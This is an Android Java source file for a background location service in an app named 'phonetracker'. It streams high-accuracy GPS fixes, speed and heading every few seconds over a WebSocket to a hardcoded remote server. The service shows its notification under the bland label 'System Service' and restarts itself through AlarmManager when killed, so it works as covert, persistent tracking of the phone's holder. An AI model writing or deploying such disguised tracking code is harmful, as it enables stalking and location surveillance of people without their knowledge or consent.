package com.tracker.phonetracker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.*;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONObject;
import java.net.URI;

public class LocationService extends Service {
    private static final String TAG = "LocationService";
    private static final String CHANNEL_ID = "tracker_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final String SERVER_URL = "wss://embedded-systems-project-60lg.onrender.com";
    
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private WebSocketClient webSocket;
    private String deviceId;
    private String deviceName;
    private boolean isConnected = false;

    @Override
    public void onCreate() {
        super.onCreate();
        
        SharedPreferences prefs = getSharedPreferences("tracker", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = java.util.UUID.randomUUID().toString();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        deviceName = prefs.getString("device_name", "Device");
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (Location location : locationResult.getLocations()) {
                    sendLocation(location);
                }
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        connectWebSocket();
        startLocationUpdates();
        
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background service");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    private void connectWebSocket() {
        try {
            String encodedName = java.net.URLEncoder.encode(deviceName, "UTF-8");
            URI uri = new URI(SERVER_URL + "?type=tracker&deviceId=" + deviceId + "&name=" + encodedName);
            
            webSocket = new WebSocketClient(uri) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    Log.d(TAG, "WebSocket connected");
                    isConnected = true;
                }

                @Override
                public void onMessage(String message) {
                    try {
                        JSONObject json = new JSONObject(message);
                        if ("registered".equals(json.optString("type"))) {
                            String newId = json.optString("deviceId");
                            if (newId != null && !newId.isEmpty()) {
                                deviceId = newId;
                                getSharedPreferences("tracker", MODE_PRIVATE)
                                    .edit().putString("device_id", deviceId).apply();
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing message", e);
                    }
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    Log.d(TAG, "WebSocket closed: " + reason);
                    isConnected = false;
                    reconnect();
                }

                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "WebSocket error", ex);
                    isConnected = false;
                }
            };
            
            webSocket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Error creating WebSocket", e);
        }
    }

    private void reconnect() {
        new android.os.Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (!isConnected) {
                connectWebSocket();
            }
        }, 5000);
    }

    private void startLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000)
            .setMinUpdateIntervalMillis(5000)
            .setWaitForAccurateLocation(false)
            .build();

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            );
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission not granted", e);
        }
    }

    private void sendLocation(Location location) {
        if (!isConnected || webSocket == null) return;
        
        try {
            JSONObject json = new JSONObject();
            json.put("type", "location");
            json.put("lat", location.getLatitude());
            json.put("lng", location.getLongitude());
            json.put("accuracy", location.getAccuracy());
            json.put("speed", location.getSpeed());
            json.put("heading", location.getBearing());
            
            webSocket.send(json.toString());
            Log.d(TAG, "Location sent: " + location.getLatitude() + ", " + location.getLongitude());
        } catch (Exception e) {
            Log.e(TAG, "Error sending location", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        
        if (fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
        }
        
        if (webSocket != null) {
            webSocket.close();
        }
        
        // Check if this was an intentional stop or system kill
        SharedPreferences prefs = getSharedPreferences("tracker", MODE_PRIVATE);
        boolean shouldRestart = prefs.getBoolean("service_running", false);
        
        if (shouldRestart) {
            // Service was killed by system, schedule restart
            Intent restartIntent = new Intent(this, LocationService.class);
            android.app.PendingIntent pendingIntent = android.app.PendingIntent.getService(
                this, 1, restartIntent, 
                android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE
            );
            android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            alarmManager.set(
                android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                android.os.SystemClock.elapsedRealtime() + 5000,  // Restart in 5 seconds
                pendingIntent
            );
        }
    }
    
    public void stopTracking() {
        // Called when user intentionally stops
        getSharedPreferences("tracker", MODE_PRIVATE)
            .edit().putBoolean("service_running", false).apply();
        stopSelf();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
